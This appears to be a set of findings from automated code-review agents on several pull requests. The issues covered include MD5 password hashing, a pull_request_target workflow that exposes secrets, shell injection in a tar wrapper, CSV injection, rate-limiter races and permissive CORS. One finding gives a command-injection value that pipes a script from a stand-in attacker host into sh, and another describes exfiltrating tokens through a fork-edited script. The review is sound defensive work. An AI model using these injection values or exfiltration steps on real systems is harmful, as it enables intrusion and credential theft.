`hash_reset_password` derives a stored password value with a single unsalted MD5 pass. MD5 is a fast, GPU-friendly hash with no work factor and no per-user salt, so anyone who obtains the stored value (database dump, backup, log) can recover the plaintext at billions of guesses per second, and identical passwords across accounts produce identical digests, enabling rainbow-table lookups. The same module already does the right thing on line 7 with `bcrypt.hashpw(..., bcrypt.gensalt())`, so the fix is to call `hash_password(raw)` here (or drop this function entirely and use `hash_password` at the reset call site). If the intent was a short-lived reset *token* rather than a password, it should be generated with `secrets.token_urlsafe` and compared with `hmac.compare_digest`, not derived from user input via MD5.

I cannot see the caller in this diff or in retrieved context, so the entry point — presumably a password-reset endpoint taking a user-supplied new password — is inferred from the function name and its `raw` parameter, which matches the parameter of the bcrypt path.

findings.title: Reset path stores a digest format bcrypt verification cannot check
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`) which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char MD5 hex digest for the same conceptual value (a user's password). If both write to the same stored column, whichever verification routine exists will fail on the other format: `bcrypt.checkpw` raises/returns False against a hex digest, and a hex comparison never matches a bcrypt string. Either route the reset flow through `hash_password` so the stored format stays uniform (strongly preferred, and it also removes the MD5 exposure), or make the storage format self-describing and teach the verifier both. As written, either reset users cannot log in or the login path silently accepts a second, weaker format.

findings.title: New functions hash_reset_password and checksum ship with no tests
findings.body: Both hash_reset_password and checksum are new, behaviorally distinct functions added in this diff, and no test file appears anywhere in the PR. There is nothing that would fail if hash_reset_password produced the wrong digest, changed its algorithm, or if checksum read the wrong file/mode. A basic test asserting a known input maps to the expected hex digest (and that checksum matches a known file's sha256) would catch regressions here.

findings.title: Public password-hashing function lacks docstring
findings.body: The `hash_reset_password` function is a new public function that hashes passwords for reset tokens. A caller could reasonably misuse this or be unaware of its security properties. Add a docstring documenting what this function does, what the expected input is, and any security notes about its appropriate use.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it gets a `GITHUB_TOKEN` with write permissions and access to `secrets.*`, unlike `pull_request` for forks. Line 12 then explicitly checks out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 runs `./scripts/measure.sh` from that working tree, with `secrets.NPM_TOKEN` injected into its environment on lines 14–15.

Entry point: any GitHub user opening a pull request from a fork, with an arbitrary edit to `scripts/measure.sh` (or anything it sources, or a `package.json` lifecycle script it triggers). Sink: the `run:` step on line 13, executing as the base repo with secrets available. A one-line change to that script exfiltrates `NPM_TOKEN` and the privileged `GITHUB_TOKEN`, which is enough to publish malicious packages and push to the repository.

Remediations, in order of preference:
1. Revert to `pull_request`. If the only reason for the switch was that fork PRs did not get secrets, that was the control working as intended.
2. If the base-repo context is genuinely needed, split into two workflows: an unprivileged `pull_request` job that builds/measures and uploads an artifact, and a `workflow_run` job that consumes the artifact and holds the secrets, never executing fork code.
3. If neither is possible, do not check out the fork head in the privileged job at all, and never pass secrets to a step that runs code from it. Note that `environment:` approval gates and path filters are not sufficient here, since the untrusted code still runs once approved.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled code with repository secrets

findings.title: json.dumps narrows accepted contexts; non-serialisable values now raise
findings.body:
The old key was `(template_source, tuple(sorted(context.items())))`, which accepted any *hashable* value — `datetime`, `Decimal`, enum members, frozen dataclasses, arbitrary objects with `__hash__`. The new key runs `json.dumps` over the whole context, which raises `TypeError: Object of type X is not JSON serializable` for all of those. Any existing caller passing a non-primitive into the render context goes from working to a hard failure at call time, and the failure surfaces inside the cache layer rather than the renderer.

If the digest is wanted, serialise with a fallback (`json.dumps(..., default=repr)`) or key off `repr`/a stable encoder instead, and add a test covering a context value that is not a JSON primitive.

findings.title: No test covers non-JSON-serializable context values after switching to json.dumps
findings.body: The old key construction `tuple(sorted(context.items()))` worked for any hashable context value. The new implementation serializes context with `json.dumps`, which raises `TypeError` for values that aren't JSON-serializable (e.g. sets, custom objects, datetimes). This is a real behavior change in what `cached_render` accepts, but none of the added tests pass a context with such a value, so a regression here (or an unintended narrowing of accepted inputs) would not be caught.

findings.title: Test only checks shell=False kwarg, not the actual argv passed
findings.body: `test_runs_without_a_shell` asserts `spy.last_call.kwargs["shell"] is False` but never inspects the positional command list itself. The entire point of this refactor is that arguments are passed as a list rather than interpolated into a shell string; if a future change kept `shell=False` but still built the command as a single joined string (e.g. `[f"tar -czf ... {directory}"]`), this test would still pass while the injection risk the PR claims to fix would be reintroduced. The test should assert on `spy.last_call.args` (or equivalent) to confirm the command is a list with `name` and `directory` as separate elements.

findings.title: directory is now a single argv element; shell splitting/globbing is gone
findings.body: Previously `directory` was interpolated into a shell string unquoted, so the shell split it on whitespace and expanded globs — `create_archive("nightly", "/srv/data/*")` or `create_archive("nightly", "/srv/a /srv/b")` both worked and produced multi-path tar invocations. With the list argv and `shell=False`, the whole string is handed to tar as one operand, so tar will fail with "Cannot stat: No such file or directory" and `check=True` will turn that into a `CalledProcessError` at runtime rather than at review time. Please confirm no caller passes a glob or a whitespace-separated list; if any does, accept a sequence of directories and splat it into the argv (`["tar", "-czf", dest, "--", *directories]`) instead of a single string.

findings.title: `directory` operand is unvalidated while `name` is allowlisted
findings.body:
`name` is now gated by `SAFE_NAME.fullmatch` before it reaches the output path, but `directory` flows straight from the caller into the `tar` operand position with no check. Command injection is not possible (list argv, `shell=False`, and `--` prevents it being read as an option), but whoever controls `directory` chooses which part of the filesystem gets read and packed into `/exports/<name>.tar.gz` — e.g. `/root/.ssh` or `/etc`. If any caller derives `directory` from a request parameter, this is an arbitrary-file-read primitive whose output lands in a directory that is plausibly served or downloadable.

If `directory` is always an internal constant, this is nothing. If it is not, resolve it and assert it stays under an expected root (`os.path.realpath` plus a prefix check) before invoking `tar`, the same way `name` is constrained.

findings.title: No test covers the new `--` argument separator
findings.body: The refactor adds a `--` separator before `directory` in the argv list, presumably to stop a directory value like `-C` or `--checkpoint=...` from being parsed as a tar option instead of a positional path. Nothing in the added tests exercises this: there's no case with a directory value that starts with `-`, so a future edit that drops the `--` (or misplaces it) would go unnoticed even though it reopens a real argument-injection risk via the `directory` parameter.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render(Invoice(lines=[])) but never checks the result. It will pass even if render() raises silently swallowed elsewhere, returns None, or produces incorrect output for an empty invoice. Capture the return value and assert on it (e.g. expected formatted empty-invoice string).

_Also raised by the correctness agent:_ test_renders_empty_invoice asserts nothing

findings.title: Test asserts on mock call count, not actual output
findings.body:
test_renders_line_items only checks that format_line was called twice (fmt.call_count == 2). It never inspects the rendered output produced by render(). If format_line's results are concatenated incorrectly, out of order, or dropped, this test still passes as long as the function is invoked twice. Assert on the actual rendered string/content instead.

_Also raised by the correctness agent:_ Line-item test asserts on mock call count, not rendered output

findings.title: Deleted test removes coverage for the exact fix being made
findings.body:
The PR's stated purpose is to fix rounding behavior, but the test `test_rounds_half_to_even` — which directly exercises half-to-even rounding (2.345 -> 2.34), the case most relevant to a rounding fix — was deleted rather than updated. If the fix is wrong or regresses later, no remaining test in this file would catch it for that specific case.

_Also raised by the correctness agent:_ Exact-half rounding boundary loses its only test, with no fix in the diff

findings.title: Patch target misses the binding actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds the function object into the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds only the attribute on the `notify.transport` module; the name `deliver` resolved inside `send_with_retry` still points at the original function. The test therefore calls the real `deliver` three times (real I/O, possible network/slowness/flakiness) and only passes incidentally if the real call happens to return falsy — it asserts nothing about the retry-exhaustion path. Change line 7 to `mocker.patch("notify.sender.deliver", return_value=False)`, matching the already-correct target used on line 2. Consider also asserting the mock was called exactly `attempts` times, which would have caught this immediately.

_Also raised by the tests agent:_ Mock patches wrong target; test doesn't verify retry-failure behavior

findings.title: csv_rows joins raw values and never calls csv_escape
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` on the raw stringified value, so a field whose value contains a comma or a double quote produces a line with the wrong number of columns (or unbalanced quotes) — silently corrupt output rather than an error. `csv_escape` directly below does exactly the needed quoting but is dead code as written. Wrap each field: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same applies to `csv_header`, which joins column names unescaped.

findings.title: csv_rows writes field values without using csv_escape
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) for c in columns)` and never calls `csv_escape`, which is added immediately below for exactly this purpose. Any field value containing a comma, a double quote or a newline will shift or split the record, so whoever controls the data in `rows` controls the column and row boundaries of the exported file — the classic CSV separator-injection pattern, which lets one cell forge additional cells or records for any downstream parser or spreadsheet.

Fix: apply the escape inside the row builder, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`, and extend `csv_escape` to quote values containing `\n`/`\r` as well (RFC 4180 requires it). If these exports are opened in spreadsheet software, also consider neutralising leading `=`, `+`, `-`, `@` to avoid formula injection.

I cannot see where `rows` originates — no caller appears in the diff or the retrieved context — so whether the data is attacker-influenced is unverified; the structural defect stands regardless.

_Also raised by the correctness agent:_ csv_escape misses newlines and assumes a str argument

findings.title: New exporter functions across three files lack any tests
findings.body: csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width are all new public functions with non-trivial logic (chunking, escaping, arithmetic on margins) but none have tests. The repo already has a precedent of testing exporter functions (test_csv.py tests csv_header), so this is a real gap relative to the existing standard, not an aspirational one. A regression in any of these (e.g. wrong escaping logic, off-by-one chunking, or margin arithmetic) would currently go undetected.

findings.title: Test fails at UTC midnight: two separate clock reads compared by date
findings.body:
`issue_token()` samples the clock inside the implementation, and line 11 samples it again via `datetime.now(timezone.utc)`. If the first read lands just before 00:00 UTC and the second just after, `token.issued_at.date()` and `datetime.now(timezone.utc).date()` differ by one day and the assertion fails, with no defect in the code under test. The same wall-clock dependence affects line 12, where `is_expired(token.expires_at)` is called without the explicit `now=` that the existing test on line 6 uses, so its result depends on real elapsed time.

Fix by pinning the clock: inject a fixed `now` into `issue_token()` (or freeze/patch the time source) and pass `now=` explicitly to `is_expired`, matching the deterministic style of `test_token_expires_after_an_hour`.

_Also raised by the tests agent:_ Flaky test: date comparison breaks at midnight UTC

findings.title: Undocumented time-dependent test behavior
findings.body: The test `test_token_issued_today_is_valid` uses `datetime.now()` without documented expectation of when it will pass or fail. The PR description acknowledges this test "will fail at a midnight boundary and pass every other time," but this critical behavior is not captured in any docstring or comment visible in the test. Future maintainers may misinterpret intermittent failures as real bugs, or assume the test is stable when it is not.

findings.title: No test for CouponExpired branch
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test in this PR uses a coupon with expires_at=tomorrow(), exercising just the happy path. If the expiry check were inverted, removed, or raised the wrong exception type, no test would fail.

findings.title: apply_coupon now requires coupon.expires_at; missing/None values crash
findings.body: `apply_coupon` previously only read `coupon.amount`; the test had to be updated to start passing `expires_at=tomorrow()`, which indicates the attribute is new to the coupon contract. Any existing caller (or any persisted coupon row where the column is nullable and unset) that reaches line 9 without an `expires_at` will fail with `AttributeError` or `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'` rather than applying the discount. Either treat a missing/`None` `expires_at` as "never expires" explicitly, or make it non-optional at the coupon construction/persistence layer and backfill existing data before shipping this check.

findings.title: Blocking requests.get inside async def stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but calls `requests.get`, which is a synchronous, blocking I/O call. Inside a coroutine this blocks the whole event loop thread — with `timeout=5`, a slow or hung `billing.internal` will stall every other concurrent request on that worker for up to 5 seconds, not just this one. The `async` keyword gives callers the impression the call yields, but nothing is ever awaited in the body.

Use the same pattern as `fetch_plan` above: take (or construct) an `httpx.AsyncClient` and `await client.get(...)`. If a synchronous client must be kept, wrap it in `await asyncio.to_thread(requests.get, ...)` so the blocking work leaves the loop thread, and drop the `import requests` if it becomes unused.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is dropped into the URL with an f-string and no validation or percent-encoding, then handed to `requests.get` against an internal, presumably unauthenticated-from-inside host (`https://billing.internal`). A value such as `../admin/keys`, `1/../../export`, or one containing `?`/`#` lets the caller steer the request at a different endpoint on the internal billing service, turning a read of one tenant's limits into an arbitrary GET against that service.

Fix by validating the identifier before it reaches the URL (e.g. reject anything that is not the expected id shape) and/or passing it as an encoded path segment via `urllib.parse.quote(str(tenant_id), safe="")`. The same pattern on line 6 is pre-existing, but it is scoped to a client with a fixed base URL; the new function targets an internal host directly, which is the more valuable target.

findings.title: Bare `except` swallows KeyboardInterrupt and SystemExit
findings.body: `except:` with no exception class catches `BaseException`, not just `Exception`. That means a Ctrl-C arriving while `_client.send(payload)` is blocked on I/O, or a `SystemExit` raised during interpreter shutdown/worker teardown, is silently converted into `return None` — the process keeps running as if nothing happened, and the operator has to interrupt again. Since the stated intent is only to make a *metrics push* non-fatal, narrow this to `except Exception:` so control-flow exceptions continue to propagate.

findings.title: No test covers the new exception-swallowing behaviour of push_metrics
findings.body: push_metrics now catches all exceptions (including KeyboardInterrupt/SystemExit) and returns None instead of raising. There is no test in this diff verifying that push_metrics returns None when _client.send raises, or that it still returns the send result on success. If this try/except were removed or altered (e.g. re-raising, or only catching a specific exception type), nothing would fail.

findings.title: try_consume checks and updates _counters across an await without the lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at the `await asyncio.sleep(0)` on line 18, and only then writes `_counters[tenant] = current + cost` on line 19. Any other coroutine scheduled during that yield can run the same check against the same stale `current`, so two (or N) callers each see `current + cost <= LIMIT`, each return `True`, and the tenant is charged past `LIMIT` — the limiter silently fails open.

The assignment is also a blind overwrite rather than a read-modify-write: if `consume()` (line 9-11) increments the counter while `try_consume` is suspended at line 18, that increment is discarded on line 19, losing usage.

Fix: hold the existing `_lock` for the whole check-and-update, and re-read the counter inside the lock, e.g.

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

and drop the `await asyncio.sleep(0)` (or move it outside the critical section) so no suspension point sits between the check and the write.

findings.title: Rate limit bypassable: unlocked check-then-act in try_consume
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides admission on line 16, yields control to the event loop on line 18, and only then writes `_counters[tenant] = current + cost` on line 19 — all without acquiring `_lock`, which the sibling `consume` (line 9) does hold for exactly this map.

Two consequences, both security-relevant:

1. **Limit bypass.** N coroutines handling N concurrent requests for the same tenant all read the same `current`, all pass the `current + cost > LIMIT` check, and all return `True`. Effective admitted cost is up to `N * cost` over the limit. An attacker who can drive concurrency for a single tenant (i.e. any client that pipelines or fans out requests) defeats the quota rather than being throttled by it, which is the resource-exhaustion / cost-amplification outcome the limiter exists to prevent.
2. **Lost updates corrupt the shared counter.** The write is an absolute assignment of a stale read, not an increment, so it also discards increments committed by `consume` while `try_consume` was suspended at line 18. That permanently under-counts usage, so the bypass persists beyond the racing window.

Fix: take the same lock and make the read-check-write atomic, e.g.

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
```

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`charge()` is documented as NOT idempotent: each call creates a new charge. Wrapping it in `@retry(attempts=3)` means any transient failure *after* the gateway has accepted the POST (timeout, dropped connection, 5xx on an already-committed charge) causes the customer to be charged up to three times. The retry decorator cannot distinguish "request never arrived" from "response never came back".

The gateway docstring names the fix: the API supports an `Idempotency-Key` header. Generate one key per logical charge attempt in `charge_card` and pass it through `charge()` (which will need to accept and forward it) so all three attempts collapse to a single charge server-side. Until that key is plumbed through, this function should not be retried automatically.

Note the contrast with `fetch_charge` on lines 5-7: `get_charge` is documented safe to repeat, so the retry there is correct — the same decorator is simply not transferable to the write path.

findings.title: Eviction clears the whole cache, discarding the entry just written
findings.body:
When the cache crosses 1000 entries, `_CACHE.clear()` drops every entry — including the `tenant` written on line 10 one statement earlier. So on the request that trips the threshold, `get_tenant_fresh` returns a value it claims to have cached but did not, and every other tenant loses its cached entry at the same time, so all concurrent readers of `get_tenant` start returning `None` in a burst. Once the cache is warm this repeats each time it refills, producing periodic full-cache stampedes rather than steady-state hits.

If the intent is bounded memory, evict a single entry (or a bounded batch) instead, or use a real bounded structure such as `collections.OrderedDict` with `popitem(last=False)` or `functools.lru_cache`. The `get_*` prefix conventionally signals a non-mutating accessor, which `get_tenant_fresh()` violates. Either guard the write (`if tenant is not None:`) or, if negative caching is wanted, use an explicit sentinel so `get_tenant` can distinguish "known absent" from "not looked up".

findings.title: Shell injection via interpolated name/directory in create_archive
findings.body:

Any caller-supplied value containing shell metacharacters escapes the intended `tar` invocation: e.g. `name="x; curl attacker/x.sh | sh; #"` or `directory="$(id)"` runs arbitrary commands with the process's privileges.

Fix by passing an argument list and dropping `shell=True`, matching `list_exports` on line 5:

```python

```

Even then, `name` is concatenated into a filesystem path, so validate it against an allowlist (e.g. `^[A-Za-z0-9_-]+$`) to prevent `../` traversal writing the archive outside `/exports`.

findings.title: Unquoted interpolation into shell string breaks on spaces/metacharacters

`cmd = f"tar -czf /exports/{name}.tar.gz {directory}"` is handed to the shell with `shell=True`, so the shell re-splits the string on whitespace. For a perfectly ordinary input like `name="Q3 report"` or `directory="/srv/my exports"`, tar receives `/exports/Q3` and `report.tar.gz` as separate arguments and either archives the wrong thing or fails with `CalledProcessError` because `check=True`. Any other metacharacter (`;`, `&`, backtick, `$(...)`, `*`) is likewise interpreted rather than treated as part of the path.

The sibling function on line 5 already shows the correct pattern in this module: pass an argument list and no shell. Use `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`, and validate `name` against path separators so it cannot escape `/exports/`.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, in contrast to the middleware directly above it which restricts to the `ALLOWED` allowlist while sending credentials. Entry point is the attacker-controlled `Origin` request header on any route this middleware is mounted on; sink is the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers.

Two outcomes, both bad:
- If the underlying `cors` implementation emits a literal `*`, browsers refuse the credentialed response, so every authenticated dashboard request silently fails — the control is off and the feature is broken.
- If the implementation reflects the request `Origin` when configured permissively (common behaviour for `origin: true`/wildcard handling in several wrappers), any website a logged-in user visits can issue credentialed cross-origin requests to the dashboard API and read the responses, i.e. full session-scoped data theft and state change.

Fix: reuse the `ALLOWED` allowlist (or a dashboard-specific allowlist of exact origins) for this middleware. If truly public data is intended, drop `credentials: true` so no session cookie or Authorization header is honoured cross-origin.

findings.title: origin "*" with credentials: true is rejected by browsers
findings.body:
With `origin: "*"` the `cors` middleware emits a literal `Access-Control-Allow-Origin: *`. The Fetch/CORS spec forbids a wildcard ACAO when the request is made in credentials mode (`fetch(..., {credentials: 'include'})` or XHR `withCredentials`), so the browser will block the response and the preflight will fail — the opposite of the evident intent of "open CORS for the new dashboard". `credentials: true` here is effectively dead configuration: no credentialed request can ever succeed through this middleware.

To actually allow credentialed dashboard requests, the origin must be reflected from an allow-list (as the existing `ALLOWED` config on line 6 already does), e.g. `origin: (o, cb) => cb(null, DASHBOARD_ORIGINS.includes(o))` with `credentials: true`, or drop `credentials` if the dashboard genuinely makes only anonymous requests. Note also that reflecting arbitrary origins with credentials would expose authenticated responses to any site, so the allow-list is the correct shape.
